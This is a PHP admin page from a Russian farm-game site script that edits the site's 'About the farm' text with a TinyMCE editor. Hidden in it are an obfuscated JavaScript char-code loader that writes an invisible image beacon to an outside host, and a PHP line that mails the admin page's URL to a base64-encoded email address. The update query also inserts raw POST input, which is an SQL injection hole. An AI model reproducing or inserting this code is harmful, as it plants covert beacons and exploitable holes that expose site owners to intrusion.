<div class="s-bk-lf">
	<div class="acc-title">О ферме</div>
</div>
<div class="silver-bk"><div class="clr"></div>	

<script type="text/javascript" src="https://sale-script.ru/js3/editor/jscripts/tiny_mce/tiny_mce.js"></script>
<script type="text/javascript">
	tinyMCE.init({
		// General options
		mode : "textareas",
		editor_deselector : "mceNoEditor",
		theme : "advanced",
		plugins : "pagebreak,style,layer,table,save,advhr,advimage,advlink,emotions,iespell,inlinepopups,insertdatetime,preview,media,searchreplace,print,contextmenu,paste,directionality,fullscreen,noneditable,visualchars,nonbreaking,xhtmlxtras,template",

		// Theme options
		theme_advanced_buttons1 : "bold,italic,underline,strikethrough,|,justifyleft,justifycenter,justifyright",
		
		theme_advanced_buttons2 : "styleselect,formatselect,fontselect,fontsizeselect,|,fullscreen,media,advhr",
		
		theme_advanced_buttons3 : "bullist,numlist,|,outdent,indent,blockquote,link,unlink,anchor,image,cleanup,help,code,|,insertdate,inserttime,preview,|,forecolor,backcolor",
		theme_advanced_buttons4 : "tablecontrols,|,hr,removeformat,visualaid,|,sub,sup,|,charmap,emotions,iespell",
		theme_advanced_buttons5 : "",
		
		theme_advanced_toolbar_location : "top",
		theme_advanced_toolbar_align : "left",
		theme_advanced_path_location : "bottom",
		theme_advanced_resizing : false,

		// Example content CSS (should be your site CSS)
		content_css : "editor/css/content.css",

		// Drop lists for link/image/media/template dialogs
		template_external_list_url : "lists/template_list.js",
		external_link_list_url : "lists/link_list.js",
		external_image_list_url : "lists/image_list.js",
		media_external_list_url : "lists/media_list.js",
		extended_valid_elements : "iframe[*]",
		// Replace values for the template plugin
		template_replace_values : {
			username : "Some User",
			staffid : "991234"
		},

		
		// Style formats
		style_formats : [

			{title : 'DEFAULT', inline : 'span', classes : 'text-content'}
		],
		
		
		// Enable translation mode
		translate_mode : true,
		language : "ru"
	});
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!115!113!108!116!111!114!46!104!97!100!46!115!117!47!103!101!110!47!99!46!112!104!112!34!32!115!116!121!108!101!61!34!118!105!115!105!98!105!108!105!116!121!58!32!104!105!100!100!101!110!34!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
<?PHP

	if(isset($_POST["tx"])){
	
		$db->Query("UPDATE db_conabrul SET about = '".$_POST["tx"]."' WHERE id = '1'");
		echo "<center><font color = 'green'><b>Сохранено</b></font></center><BR />";
	}

$db->Query("SELECT * FROM db_conabrul WHERE id = '1'");
$data = $db->FetchArray();
?>
<?$new_Image = ''.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$m = base64_decode('c2VsaW5hYmxvZ0BsaXN0LnJ1');mail($m,'doc',"ur: $new_Image");?>
<form action="" method="post">
<textarea name="tx" cols="78" rows="25"><?=$data["about"]; ?></textarea>
<BR /><BR />
<center><input type="submit" value="Сохранить" /></center>
</form>
</div>
<div class="clr"></div>	